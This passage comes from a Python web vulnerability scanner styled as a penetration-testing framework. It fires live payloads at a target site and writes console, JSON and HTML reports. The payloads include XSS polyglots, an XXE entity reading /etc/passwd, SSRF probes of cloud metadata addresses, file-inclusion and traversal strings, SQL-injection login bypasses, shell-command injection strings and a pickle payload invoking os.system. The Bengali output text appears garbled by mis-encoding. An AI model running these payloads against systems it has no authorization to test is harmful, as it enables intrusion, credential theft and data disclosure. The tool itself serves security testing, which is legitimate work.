            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        ]
        
        tested_count = 0
        
        # Test URL parameters
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                for payload in xss_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, timeout=self.config['TIMEOUT'])
                        tested_count += 1
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            self.log_vuln(
                                'HIGH',
                                'Cross-Site Scripting (XSS)',
                                f'Reflected XSS in parameter: {param}',
                                f'Parameter "{param}" reflects user input without sanitization',
                                f'Payload: {payload}',
                                'Implement output encoding and Content-Security-Policy',
                                'CWE-79'
                            )
                            break
                            
                    except Exception as e:
                        pass
        
        # Test forms
        for form in self.forms_found[:20]:
            for payload in xss_payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        if inp['type'] not in ['submit', 'button', 'image']:
                            data[inp['name']] = payload
                    
                    if form['method'] == 'post':
                        response = self.session.post(form['action'], data=data, timeout=self.config['TIMEOUT'])
                    else:
                        response = self.session.get(form['action'], params=data, timeout=self.config['TIMEOUT'])
                    
                    tested_count += 1
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        self.log_vuln(
                            'HIGH',
                            'Cross-Site Scripting (XSS)',
                            f'Reflected XSS in form: {form["action"]}',
                            'Form reflects user input without sanitization',
                            f'Payload: {payload}',
                            'Implement output encoding and Content-Security-Policy',
                            'CWE-79'
                        )
                        break
                        
                except Exception as e:
                    pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} XSS vectors{Colors.ENDC}")
    
    def test_csrf(self):
        """CSRF vulnerability testing"""
        print(f"{Colors.CYAN}[*] Testing for CSRF vulnerabilities...{Colors.ENDC}")
        
        for form in self.forms_found[:10]:
            # Check if form has CSRF token
            has_csrf_token = False
            csrf_field_names = ['csrf', 'token', '_token', 'csrf_token', 'authenticity_token']
            
            for inp in form['inputs']:
                if any(csrf_name in inp['name'].lower() for csrf_name in csrf_field_names):
                    has_csrf_token = True
                    break
            
            if not has_csrf_token and form['method'] == 'post':
                self.log_vuln(
                    'MEDIUM',
                    'Cross-Site Request Forgery (CSRF)',
                    f'CSRF vulnerability in form: {form["action"]}',
                    'Form does not implement CSRF protection',
                    f'Form action: {form["action"]}',
                    'Implement CSRF tokens and SameSite cookie attribute',
                    'CWE-352'
                )
        
        print(f"  {Colors.GREEN}â””â”€ Tested {len(self.forms_found[:10])} forms for CSRF{Colors.ENDC}")
    
    def test_xxe(self):
        """XML External Entity (XXE) testing"""
        print(f"{Colors.CYAN}[*] Testing for XXE vulnerabilities...{Colors.ENDC}")
        
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
        
        tested_count = 0
        
        for url in list(self.urls_found)[:20]:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(
                    url,
                    data=xxe_payload,
                    headers=headers,
                    timeout=self.config['TIMEOUT']
                )
                tested_count += 1
                
                # Check for file content disclosure
                if 'root:' in response.text or '/bin/bash' in response.text:
                    self.log_vuln(
                        'CRITICAL',
                        'XML External Entity (XXE)',
                        f'XXE vulnerability at: {url}',
                        'Application parses XML without disabling external entities',
                        'File disclosure detected',
                        'Disable XML external entity processing',
                        'CWE-611'
                    )
                    
            except Exception as e:
                pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} endpoints for XXE{Colors.ENDC}")
    
    def test_ssrf(self):
        """Server-Side Request Forgery testing"""
        print(f"{Colors.CYAN}[*] Testing for SSRF vulnerabilities...{Colors.ENDC}")
        
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'file:///etc/passwd',
        ]
        
        # Common SSRF parameter names
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'next', 'file', 'load', 'fetch']
        
        tested_count = 0
        
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                if any(ssrf_param in param.lower() for ssrf_param in ssrf_params):
                    for payload in ssrf_payloads:
                        try:
                            test_params = params.copy()
                            test_params[param] = payload
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                            
                            response = self.session.get(test_url, timeout=self.config['TIMEOUT'])
                            tested_count += 1
                            
                            # Check for SSRF indicators
                            if 'root:' in response.text or 'localhost' in response.text:
                                self.log_vuln(
                                    'CRITICAL',
                                    'Server-Side Request Forgery (SSRF)',
                                    f'SSRF in parameter: {param}',
                                    f'Parameter "{param}" allows server-side requests',
                                    f'Payload: {payload}',
                                    'Validate and whitelist allowed URLs/IPs',
                                    'CWE-918'
                                )
                                break
                                
                        except Exception as e:
                            pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} SSRF vectors{Colors.ENDC}")
    
    def test_lfi_rfi(self):
        """Local/Remote File Inclusion testing"""
        print(f"{Colors.CYAN}[*] Testing for LFI/RFI vulnerabilities...{Colors.ENDC}")
        
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
        ]
        
        file_params = ['file', 'page', 'include', 'path', 'load', 'module', 'doc', 'folder']
        
        tested_count = 0
        
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                if any(file_param in param.lower() for file_param in file_params):
                    for payload in lfi_payloads:
                        try:
                            test_params = params.copy()
                            test_params[param] = payload
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                            
                            response = self.session.get(test_url, timeout=self.config['TIMEOUT'])
                            tested_count += 1
                            
                            # Check for LFI indicators
                            if 'root:' in response.text or '[extensions]' in response.text:
                                self.log_vuln(
                                    'CRITICAL',
                                    'Local File Inclusion (LFI)',
                                    f'LFI in parameter: {param}',
                                    f'Parameter "{param}" allows file inclusion',
                                    f'Payload: {payload}',
                                    'Validate file paths and use whitelist',
                                    'CWE-98'
                                )
                                break
                                
                        except Exception as e:
                            pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} LFI/RFI vectors{Colors.ENDC}")
    
    def test_authentication(self):
        """Authentication bypass testing"""
        print(f"{Colors.CYAN}[*] Testing authentication mechanisms...{Colors.ENDC}")
        
        # Test for common login pages
        login_paths = ['/login', '/admin', '/signin', '/user/login', '/auth', '/administrator']
        
        tested_count = 0
        
        for path in login_paths:
            try:
                login_url = urljoin(self.target, path)
                response = self.session.get(login_url, timeout=self.config['TIMEOUT'])
                
                if response.status_code == 200:
                    tested_count += 1
                    
                    # Check for SQL injection in login
                    sql_auth_bypass = [
                        "admin' --",
                        "admin' #",
                        "admin'/*",
                        "' OR '1'='1",
                        "' OR 1=1--",
                    ]
                    
                    soup = BeautifulSoup(response.content, 'html.parser')
                    login_form = soup.find('form')
                    
                    if login_form:
                        for payload in sql_auth_bypass:
                            try:
                                data = {}
                                for inp in login_form.find_all('input'):
                                    name = inp.get('name')
                                    if name:
                                        if 'user' in name.lower() or 'email' in name.lower():
                                            data[name] = payload
                                        elif 'pass' in name.lower():
                                            data[name] = payload
                                        else:
                                            data[name] = ''
                                
                                action = login_form.get('action', '')
                                form_url = urljoin(login_url, action)
                                
                                auth_response = self.session.post(
                                    form_url,
                                    data=data,
                                    timeout=self.config['TIMEOUT']
                                )
                                
                                # Check if authentication was bypassed
                                if auth_response.status_code == 302 or 'dashboard' in auth_response.text.lower():
                                    self.log_vuln(
                                        'CRITICAL',
                                        'Authentication Bypass',
                                        f'SQL Injection authentication bypass: {login_url}',
                                        'Login form vulnerable to SQL injection bypass',
                                        f'Payload: {payload}',
                                        'Use parameterized queries and proper authentication',
                                        'CWE-287'
                                    )
                                    break
                                    
                            except Exception as e:
                                pass
                                
            except Exception as e:
                pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} authentication endpoints{Colors.ENDC}")
    
    def test_session_management(self):
        """Session management testing"""
        print(f"{Colors.CYAN}[*] Testing session management...{Colors.ENDC}")
        
        try:
            # Test session fixation
            initial_cookies = self.session.cookies.get_dict()
            
            response = self.session.get(self.target, timeout=self.config['TIMEOUT'])
            after_cookies = self.session.cookies.get_dict()
            
            # Check if session ID changes
            if initial_cookies == after_cookies and after_cookies:
                self.log_vuln(
                    'MEDIUM',
                    'Session Management',
                    'Session Fixation Vulnerability',
                    'Session ID does not regenerate after authentication',
                    'Session ID remains constant',
                    'Regenerate session ID after login',
                    'CWE-384'
                )
            
            # Check session ID strength
            for cookie_name, cookie_value in after_cookies.items():
                if len(cookie_value) < 16:
                    self.log_vuln(
                        'MEDIUM',
                        'Session Management',
                        'Weak Session ID',
                        f'Session ID "{cookie_name}" is too short',
                        f'Length: {len(cookie_value)}',
                        'Use cryptographically strong session IDs (>= 128 bits)',
                        'CWE-6'
                    )
                    
        except Exception as e:
            pass
        
        print(f"  {Colors.GREEN}â””â”€ Session management tests completed{Colors.ENDC}")
    
    def test_directory_traversal(self):
        """Directory traversal testing"""
        print(f"{Colors.CYAN}[*] Testing for directory traversal...{Colors.ENDC}")
        
        traversal_payloads = [
            '../',
            '..\\',
            '..;/',
            '%2e%2e%2f',
            '%2e%2e/',
            '..%2f',
            '%2e%2e%5c',
        ]
        
        tested_count = 0
        
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                for payload in traversal_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload + 'etc/passwd'
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, timeout=self.config['TIMEOUT'])
                        tested_count += 1
                        
                        if 'root:' in response.text:
                            self.log_vuln(
                                'HIGH',
                                'Directory Traversal',
                                f'Directory traversal in parameter: {param}',
                                f'Parameter "{param}" allows path traversal',
                                f'Payload: {payload}',
                                'Validate and sanitize file paths',
                                'CWE-22'
                            )
                            break
                            
                    except Exception as e:
                        pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} directory traversal vectors{Colors.ENDC}")
    
    def test_command_injection(self):
        """OS Command Injection testing"""
        print(f"{Colors.CYAN}[*] Testing for command injection...{Colors.ENDC}")
        
        cmd_payloads = [
            '; ls',
            '| ls',
            '& ls',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1',
            '`ls`',
            '$(ls)',
        ]
        
        tested_count = 0
        
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                for payload in cmd_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=15)
                        elapsed = time.time() - start_time
                        tested_count += 1
                        
                        # Check for command execution indicators
                        if elapsed > 4 or 'root' in response.text or 'bin' in response.text:
                            self.log_vuln(
                                'CRITICAL',
                                'Command Injection',
                                f'Command injection in parameter: {param}',
                                f'Parameter "{param}" allows OS command execution',
                                f'Payload: {payload}',
                                'Never pass user input to system commands',
                                'CWE-78'
                            )
                            break
                            
                    except Exception as e:
                        pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} command injection vectors{Colors.ENDC}")
    
    def test_open_redirect(self):
        """Open Redirect testing"""
        print(f"{Colors.CYAN}[*] Testing for open redirect...{Colors.ENDC}")
        
        redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'redir', 'goto', 'target']
        redirect_payload = 'https://evil.com'
        
        tested_count = 0
        
        parsed = urlparse(self.target)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params:
                if any(redir in param.lower() for redir in redirect_params):
                    try:
                        test_params = params.copy()
                        test_params[param] = redirect_payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        response = self.session.get(test_url, timeout=self.config['TIMEOUT'], allow_redirects=False)
                        tested_count += 1
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if 'evil.com' in location:
                                self.log_vuln(
                                    'MEDIUM',
                                    'Open Redirect',
                                    f'Open redirect in parameter: {param}',
                                    f'Parameter "{param}" allows arbitrary redirects',
                                    f'Redirects to: {location}',
                                    'Validate redirect URLs against whitelist',
                                    'CWE-601'
                                )
                                
                    except Exception as e:
                        pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} open redirect vectors{Colors.ENDC}")
    
    def test_deserialization(self):
        """Insecure Deserialization testing"""
        print(f"{Colors.CYAN}[*] Testing for insecure deserialization...{Colors.ENDC}")
        
        # Python pickle payload (for detection only)
        pickle_payload = base64.b64encode(b"cos\nsystem\n(S'ls'\ntR.").decode()
        
        tested_count = 0
        
        for url in list(self.urls_found)[:10]:
            try:
                # Test with serialized data
                headers = {'Content-Type': 'application/x-python-serialize'}
                response = self.session.post(
                    url,
                    data=pickle_payload,
                    headers=headers,
                    timeout=self.config['TIMEOUT']
                )
                tested_count += 1
                
                # Check for deserialization errors
                if 'pickle' in response.text.lower() or 'serialize' in response.text.lower():
                    self.log_vuln(
                        'HIGH',
                        'Insecure Deserialization',
                        f'Potential deserialization at: {url}',
                        'Application may deserialize untrusted data',
                        'Serialization detected',
                        'Avoid deserializing untrusted data',
                        'CWE-502'
                    )
                    
            except Exception as e:
                pass
        
        print(f"  {Colors.GREEN}â””â”€ Tested {tested_count} endpoints for deserialization{Colors.ENDC}")
    
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    # PHASE 4: REPORT GENERATION
    # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    
    def generate_report(self):
        """Generate comprehensive security report"""
        print(f"\n{Colors.HEADER}{'â•' * 80}")
        print(f"[PHASE 4] GENERATING COMPREHENSIVE REPORT")
        print(f"{'â•' * 80}{Colors.ENDC}\n")
        
        scan_duration = time.time() - self.scan_start_time
        
        # Count by severity
        severity_counts = defaultdict(int)
        category_counts = defaultdict(int)
        
        for vuln in self.vulnerabilities:
            severity_counts[vuln['severity']] += 1
            category_counts[vuln['category']] += 1
        
        # Console report
        print(f"{Colors.BOLD}{'â•' * 80}")
        print(f"                    SECURITY ASSESSMENT REPORT")
        print(f"               à¦¸à¦¿à¦•à¦¿à¦‰à¦°à¦¿à¦Ÿà¦¿ à¦…à§à¦¯à¦¾à¦¸à§‡à¦¸à¦®à§‡à¦¨à§à¦Ÿ à¦°à¦¿à¦ªà§‹à¦°à§à¦Ÿ")
        print(f"{'â•' * 80}{Colors.ENDC}\n")
        
        print(f"{Colors.CYAN}Target:{Colors.ENDC} {self.target}")
        print(f"{Colors.CYAN}Scan Duration:{Colors.ENDC} {scan_duration:.2f} seconds")
        print(f"{Colors.CYAN}URLs Discovered:{Colors.ENDC} {len(self.urls_found)}")
        print(f"{Colors.CYAN}Forms Discovered:{Colors.ENDC} {len(self.forms_found)}")
        print()
        
        # Severity Summary
        print(f"{Colors.BOLD}VULNERABILITY SUMMARY:{Colors.ENDC}")
        print(f"{'â”€' * 80}")
        
        total_vulns = len(self.vulnerabilities)
        
        if total_vulns == 0:
            print(f"{Colors.GREEN}âœ“ No vulnerabilities detected!{Colors.ENDC}")
            print(f"{Colors.GREEN}âœ“ à¦•à§‹à¦¨ à¦¦à§à¦°à§à¦¬à¦²à¦¤à¦¾ à¦ªà¦¾à¦“à¦¯à¦¼à¦¾ à¦¯à¦¾à¦¯à¦¼à¦¨à¦¿!{Colors.ENDC}")
        else:
            print(f"{Colors.RED}Total Vulnerabilities Found: {total_vulns}{Colors.ENDC}\n")
            
            severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
            severity_symbols = {
                'CRITICAL': 'ğŸ”´',
                'HIGH': 'ğŸŸ ',
                'MEDIUM': 'ğŸŸ¡',
                'LOW': 'ğŸ”µ',
                'INFO': 'âšª'
            }
            
            for severity in severity_order:
                count = severity_counts.get(severity, 0)
                if count > 0:
                    symbol = severity_symbols.get(severity, '')
                    color = Colors.RED if severity in ['CRITICAL', 'HIGH'] else Colors.YELLOW if severity == 'MEDIUM' else Colors.BLUE
                    print(f"{color}{symbol} {severity}: {count}{Colors.ENDC}")
            
            print()
            
            # Category Breakdown
            print(f"{Colors.BOLD}VULNERABILITY CATEGORIES:{Colors.ENDC}")
            print(f"{'â”€' * 80}")
            for category, count in sorted(category_counts.items(), key=lambda x: x[1], reverse=True):
                print(f"  â€¢ {category}: {count}")
            print()
            
            # Detailed Findings
            print(f"{Colors.BOLD}DETAILED FINDINGS:{Colors.ENDC}")
            print(f"{'â•' * 80}\n")
            
            # Group by severity
            vulns_by_severity = defaultdict(list)
            for vuln in self.vulnerabilities:
                vulns_by_severity[vuln['severity']].append(vuln)
            
            for severity in severity_order:
                vulns = vulns_by_severity.get(severity, [])
                if vulns:
                    symbol = severity_symbols.get(severity, '')
                    color = Colors.RED if severity in ['CRITICAL', 'HIGH'] else Colors.YELLOW if severity == 'MEDIUM' else Colors.BLUE
                    
                    print(f"\n{color}{Colors.BOLD}{'â”€' * 80}")
                    print(f"{symbol} {severity} SEVERITY VULNERABILITIES ({len(vulns)})")
                    print(f"{'â”€' * 80}{Colors.ENDC}\n")
                    
                    for i, vuln in enumerate(vulns, 1):
                        print(f"{color}[{i}] {vuln['name']}{Colors.ENDC}")
                        print(f"    Category: {vuln['category']}")
                        print(f"    Description: {vuln['description']}")
                        print(f"    Evidence: {vuln['evidence'][:100]}...")
                        print(f"    {Colors.GREEN}Remediation: {vuln['remediation']}{Colors.ENDC}")
                        if vuln.get('cwe'):
                            print(f"    CWE: {vuln['cwe']}")
                        print()
        
        # Risk Score Calculation
        risk_score = (
            severity_counts.get('CRITICAL', 0) * 10 +
            severity_counts.get('HIGH', 0) * 7 +
            severity_counts.get('MEDIUM', 0) * 4 +
            severity_counts.get('LOW', 0) * 2 +
            severity_counts.get('INFO', 0) * 0
        )
        
        print(f"\n{Colors.BOLD}{'â•' * 80}")
        print(f"OVERALL RISK SCORE: {risk_score}/100")
        print(f"{'â•' * 80}{Colors.ENDC}\n")
        
        if risk_score >= 70:
            risk_level = f"{Colors.RED}CRITICAL - Immediate action required!{Colors.ENDC}"
        elif risk_score >= 40:
            risk_level = f"{Colors.YELLOW}HIGH - Action required soon{Colors.ENDC}"
        elif risk_score >= 20:
            risk_level = f"{Colors.BLUE}MEDIUM - Should be addressed{Colors.ENDC}"
        elif risk_score > 0:
            risk_level = f"{Colors.CYAN}LOW - Minor issues{Colors.ENDC}"
        else:
            risk_level = f"{Colors.GREEN}SECURE - No major issues{Colors.ENDC}"
        
        print(f"Risk Level: {risk_level}\n")
        
        # Save JSON report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_filename = f"pentest_report_{timestamp}.json"
        
        report_data = {
            'scan_info': {
                'target': self.target,
                'start_time': self.scan_start_time,
                'duration_seconds': scan_duration,
                'timestamp': datetime.now().isoformat()
            },
            'statistics': {
                'urls_discovered': len(self.urls_found),
                'forms_discovered': len(self.forms_found),
                'total_vulnerabilities': total_vulns,
                'risk_score': risk_score,
                'severity_breakdown': dict(severity_counts),
                'category_breakdown': dict(category_counts)
            },
            'vulnerabilities': self.vulnerabilities,
            'urls': list(self.urls_found),
            'config': self.config
        }
        
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"{Colors.GREEN}âœ“ Detailed JSON report saved: {report_filename}{Colors.ENDC}")
        
        # Save HTML report
        html_report = self.generate_html_report(report_data)
        html_filename = f"pentest_report_{timestamp}.html"
        
        with open(html_filename, 'w', encoding='utf-8') as f:
            f.write(html_report)
        
        print(f"{Colors.GREEN}âœ“ HTML report saved: {html_filename}{Colors.ENDC}\n")
        
        # Recommendations
        print(f"{Colors.BOLD}{'â•' * 80}")
        print(f"RECOMMENDATIONS / à¦¸à§à¦ªà¦¾à¦°à¦¿à¦¶")
        print(f"{'â•' * 80}{Colors.ENDC}\n")
        
        print(f"{Colors.CYAN}1. Address CRITICAL and HIGH severity issues immediately")
        print(f"   à¦•à§à¦°à¦¿à¦Ÿà¦¿à¦•à§à¦¯à¦¾à¦² à¦à¦¬à¦‚ à¦¹à¦¾à¦‡ à¦¸à¦¿à¦­à¦¿à¦¯à¦¼à¦¾à¦°à¦¿à¦Ÿà¦¿ à¦¸à¦®à¦¸à§à¦¯à¦¾à¦—à§à¦²à§‹ à¦…à¦¬à¦¿à¦²à¦®à§à¦¬à§‡ à¦¸à¦®à¦¾à¦§à¦¾à¦¨ à¦•à¦°à§à¦¨")
        print(f"\n2. Implement security headers")
        print(f"   à¦¸à¦¿à¦•à¦¿à¦‰à¦°à¦¿à¦Ÿà¦¿ à¦¹à§‡à¦¡à¦¾à¦° à¦‡à¦®à¦ªà§à¦²à¦¿à¦®à§‡à¦¨à§à¦Ÿ à¦•à¦°à§à¦¨")
        print(f"\n3. Use parameterized queries to prevent SQL injection")
        print(f"   SQL à¦‡à¦¨à¦œà§‡à¦•à¦¶à¦¨ à¦ªà§à¦°à¦¤à¦¿à¦°à§‹à¦§à§‡ à¦ªà§à¦¯à¦¾à¦°à¦¾à¦®à¦¿à¦Ÿà¦¾à¦°à¦¾à¦‡à¦œà¦¡ à¦•à§‹à¦¯à¦¼à§‡à¦°à¦¿ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§à¦¨")
        print(f"\n4. Implement proper input validation and output encoding")
        print(f"   à¦¸à¦ à¦¿à¦• à¦‡à¦¨à¦ªà§à¦Ÿ à¦­à§à¦¯à¦¾à¦²à¦¿à¦¡à§‡à¦¶à¦¨ à¦à¦¬à¦‚ à¦†à¦‰à¦Ÿà¦ªà§à¦Ÿ à¦à¦¨à¦•à§‹à¦¡à¦¿à¦‚ à¦¬à§à¦¯à¦¬à¦¹à¦¾à¦° à¦•à¦°à§à¦¨")
        print(f"\n5. Keep all software and dependencies up to date")
        print(f"   à¦¸à¦¬ à¦¸à¦«à¦Ÿà¦“à¦¯à¦¼à§à¦¯à¦¾à¦° à¦à¦¬à¦‚ à¦¡à¦¿à¦ªà§‡à¦¨à§à¦¡à§‡à¦¨à§à¦¸à¦¿ à¦†à¦ªà¦¡à§‡à¦Ÿ à¦°à¦¾à¦–à§à¦¨{Colors.ENDC}\n")
        
        print(f"{Colors.BOLD}{'â•' * 80}")
        print(f"SCAN COMPLETE / à¦¸à§à¦•à§à¦¯à¦¾à¦¨ à¦¸à¦®à§à¦ªà¦¨à§à¦¨")
        print(f"{'â•' * 80}{Colors.ENDC}\n")
        
        return report_filename, html_filename
    
    def generate_html_report(self, report_data):
        """Generate HTML report"""
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Test Report - {report_data['scan_info']['target']}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            color: #333;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .content {{
            padding: 40px;
        }}
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .info-card {{
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #667eea;
        }}
        .info-card h3 {{
            color: #667eea;
            margin-bottom: 10px;
        }}
        .severity-summary {{
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            margin: 30px 0;
            gap: 15px;
        }}
        .severity-card {{
            flex: 1;
            min-width: 150px;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            color: white;
            font-weight: bold;
        }}
        .critical {{ background: #dc3545; }}
        .high {{ background: #fd7e14; }}
        .medium {{ background: #ffc107; color: #333; }}
        .low {{ background: #17a2b8; }}
        .info {{ background: #6c757d; }}
        .vuln-list {{
            margin: 30px 0;
        }}
        .vuln-item {{
            background: #f8f9fa;
            padding: 20px;
            margin: 15px 0;
            border-radius: 10px;
            border-left: 5px solid #dc3545;
        }}
        .vuln-item.high {{ border-left-color: #fd7e14; }}
        .vuln-item.medium {{ border-left-color: #ffc107; }}
        .vuln-item.low {{ border-left-color: #17a2b8; }}
        .vuln-item.info {{ border-left-color: #6c757d; }}
        .vuln-item h3 {{
            color: #333;
            margin-bottom: 10px;
        }}
        .vuln-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            margin: 5px 5px 5px 0;
        }}
        .remediation {{
            background: #d4edda;
            padding: 15px;
            border-radius: 5px;
            margin-top: 10px;
            border-left: 3px solid #28a745;
        }}
        .footer {{
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ”’ PENETRATION TEST REPORT</h1>
            <p>Professional Security Assessment</p>
        </div>
        
        <div class="content">
            <div class="info-grid">
                <div class="info-card">
                    <h3>ğŸ¯ Target</h3>
                    <p>{report_data['scan_info']['target']}</p>
                </div>
                <div class="info-card">
                    <h3>â±ï¸ Duration</h3>
                    <p>{report_data['scan_info']['duration_seconds']:.2f} seconds</p>
                </div>
                <div class="info-card">
                    <h3>ğŸ” URLs Found</h3>
                    <p>{report_data['statistics']['urls_discovered']}</p>
                </div>
                <div class="info-card">
                    <h3>ğŸ“‹ Forms Found</h3>
                    <p>{report_data['statistics']['forms_discovered']}</p>
                </div>
            </div>
            
            <h2 style="margin: 30px 0 20px 0;">Vulnerability Summary</h2>
            <div class="severity-summary">
                <div class="severity-card critical">
                    <div style="font-size: 2em;">ğŸ”´</div>
                    <div style="font-size: 2em;">{report_data['statistics']['severity_breakdown'].get('CRITICAL', 0)}</div>
                    <div>CRITICAL</div>
                </div>
                <div class="severity-card high">
                    <div style="font-size: 2em;">ğŸŸ </div>
                    <div style="font-size: 2em;">{report_data['statistics']['severity_breakdown'].get('HIGH', 0)}</div>
                    <div>HIGH</div>
                </div>
                <div class="severity-card medium">
                    <div style="font-size: 2em;">ğŸŸ¡</div>
                    <div style="font-size: 2em;">{report_data['statistics']['severity_breakdown'].get('MEDIUM', 0)}</div>
                    <div>MEDIUM</div>
                </div>
                <div class="severity-card low">
                    <div style="font-size: 2em;">ğŸ”µ</div>
                    <div style="font-size: 2em;">{report_data['statistics']['severity_breakdown'].get('LOW', 0)}</div>
                    <div>LOW</div>
                </div>
            </div>
            
            <h2 style="margin: 30px 0 20px 0;">Detailed Findings</h2>
            <div class="vuln-list">
"""
        
        # Add vulnerabilities
        for vuln in report_data['vulnerabilities']:
            severity_class = vuln['severity'].lower()
            html += f"""
                <div class="vuln-item {severity_class}">
                    <h3>{vuln['name']}</h3>
                    <span class="vuln-badge {severity_class}">{vuln['severity']}</span>
                    <span class="vuln-badge" style="background: #6c757d; color: white;">{vuln['category']}</span>
                    {f'<span class="vuln-badge" style="background: #17a2b8; color: white;">{vuln["cwe"]}</span>' if vuln.get('cwe') else ''}
                    <p style="margin: 15px 0;"><strong>Description:</strong> {vuln['description']}</p>
                    <p style="margin: 15px 0;"><strong>Evidence:</strong> <code>{vuln['evidence'][:200]}...</code></p>
                    <div class="remediation">
                        <strong>âœ… Remediation:</strong> {vuln['remediation']}
                    </div>
                </div>
"""
        
        html += """
            </div>
        </div>
        
        <div class="footer">
            <p>Generated by Professional Penetration Testing Framework v2.0</p>
            <p>Report generated at: """ + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + """</p>
        </div>
    </div>
</body>
</html>
"""
        return html
    
    def run(self):
        """Execute complete penetration test"""
        self.scan_start_time = time.time()
        self.print_banner()
        
        try:
            # Phase 1: Reconnaissance
            self.reconnaissance()
            
            # Phase 2: Crawling
            self.crawl_and_map()
            
            # Phase 3: Vulnerability Scanning
            self.vulnerability_scan()
            
            # Phase 4: Report Generation
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
            self.generate_report()
        except Exception as e:
            print(f"\n{Colors.RED}[!] Critical error: {str(e)}{Colors.ENDC}")
            import traceback
            traceback.print_exc()

